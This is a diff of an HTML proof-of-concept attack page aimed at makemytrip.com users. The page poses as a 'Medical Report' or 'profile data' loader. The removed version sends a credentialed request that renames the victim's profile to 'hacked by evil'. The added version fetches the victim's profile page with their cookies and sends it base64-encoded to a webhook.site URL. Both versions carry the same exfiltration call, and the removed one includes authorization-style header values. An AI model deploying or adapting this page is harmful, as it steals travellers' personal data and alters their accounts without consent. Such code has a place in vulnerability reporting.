@@ -1,52 +1,15 @@
 <html>
   <body>
-    <h1>Medical Report Loading...</h1>
+    <h2>Loading profile data...</h2>
     <script>
-      fetch("https://mapi.makemytrip.com/ext/web/pwa/user/update?region=in&currency=inr&user-currency=INR&language=eng", {
-        method: 'POST',
-        credentials: 'include',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': 'h4nhc9jcgpAGIjp',
-          'Mmt-Auth': 'MAT169a3a18a6ae879a57d373a6d3127aa7899d4444b1502accd989e06b4bfc9ec9200110ddf3c6f0e4aba57a8cb2fc421b2P',
-          'Deviceid': '953e801f-bf2a-4fcd-9c16-9ada830a431d',
-          'Language': 'eng',
-          'App-Ver': '1.0.1',
-          'Usr-Mcid': '953e801f-bf2a-4fcd-9c16-9ada830a431d',
-          'Vid': '953e801f-bf2a-4fcd-9c16-9ada830a431d',
-          'Tid': '953e801f-bf2a-4fcd-9c16-9ada830a431d',
-          'Entity-Name': 'india',
-          'Os': 'pwa',
-          'Profile': 'PERSONAL',
-          'User-Country': 'IN',
-          'Currency': 'inr',
-          'Mcid': '953e801f-bf2a-4fcd-9c16-9ada830a431d',
-          'Visitor-Id': '953e801f-bf2a-4fcd-9c16-9ada830a431d',
-          'User-Currency': 'INR',
-          'Country': 'IN',
-          'Pfm': 'desktop',
-          'Region': 'in',
-          'Origin': 'https://www.makemytrip.com',
-          'Referer': 'https://www.makemytrip.com',
-          'Accept': 'application/json'
-        },
-        body: JSON.stringify({
-          "query": [[{
-            "name": "extendedUser",
-            "values": {
-              "personalDetails": {
-                "name": {
-                  "firstName": "hacked",
-                  "lastName": "by evil"
-                }
-              }
-            }
-          }]]
-        })
+      fetch("https://www.makemytrip.com/my-profile/", {
+        method: "GET",
+        credentials: "include"
       })
       .then(response => response.text())
       .then(data => {
-        fetch("https://webhook.site/d5cb6119-e02e-4635-b237-80b1a0de70b6?data=" + encodeURIComponent(btoa(data)));
+        // Exfiltrate to your webhook for PoC demonstration
+        fetch("https://webhook.site/d5cb6119-e02e-4635-b237-80b1a0de70b6?profile=" + encodeURIComponent(btoa(data)));
       });
     </script>
   </body>
